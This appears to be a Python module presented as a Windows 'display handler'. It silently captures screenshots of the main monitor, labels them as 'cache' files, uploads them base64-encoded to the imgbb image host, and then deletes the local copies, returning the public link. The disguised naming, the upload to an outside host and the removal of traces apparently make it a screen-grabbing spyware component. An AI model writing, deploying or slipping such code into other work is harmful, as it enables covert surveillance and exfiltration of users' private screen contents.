# nt_display.py - Windows Display Handler
import mss
from PIL import Image
import os
import time
import requests
import base64
from datetime import datetime
import sys_config as config

class DisplayHandler:
    def __init__(self):
        self.sct = mss.mss()
        self.carpeta_temp = "temp_cache"
        if not os.path.exists(self.carpeta_temp):
            os.makedirs(self.carpeta_temp)
        
    def capturar_pantalla(self):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:21]
            filename = os.path.join(self.carpeta_temp, f"cache_{timestamp}.jpg")
            monitor = self.sct.monitors[1]
            screenshot = self.sct.grab(monitor)
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            max_size = 1920
            if img.width > max_size:
                ratio = max_size / img.width
                nuevo_alto = int(img.height * ratio)
                img = img.resize((max_size, nuevo_alto), Image.Resampling.LANCZOS)
            img.save(filename, 'JPEG', quality=config.COMPRESS_LEVEL, optimize=True)
            return filename
        except Exception as e:
            print(f"[!] Error en cache: {e}")
            return None
    
    def subir_cache(self, image_path):
        try:
            if not os.path.exists(image_path):
                return None
            with open(image_path, 'rb') as f:
                img_data = base64.b64encode(f.read()).decode('utf-8')
            url = "https://api.imgbb.com/1/upload"
            payload = {
                'key': config.IMGBB_API_KEY,
                'image': img_data,
                'expiration': config.EXPIRATION_TIME,
                'name': os.path.basename(image_path)
            }
            response = requests.post(url, data=payload, timeout=15)
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    image_url = data['data']['url']
                    try:
                        os.remove(image_path)
                    except:
                        pass
                    return image_url
            return None
        except Exception as e:
            print(f"[!] Error en subida de cache: {e}")
            return None
    
    def limpiar_cache(self):
        try:
            for archivo in os.listdir(self.carpeta_temp):
                ruta = os.path.join(self.carpeta_temp, archivo)
                if os.path.isfile(ruta):
                    os.remove(ruta)
        except:
            pass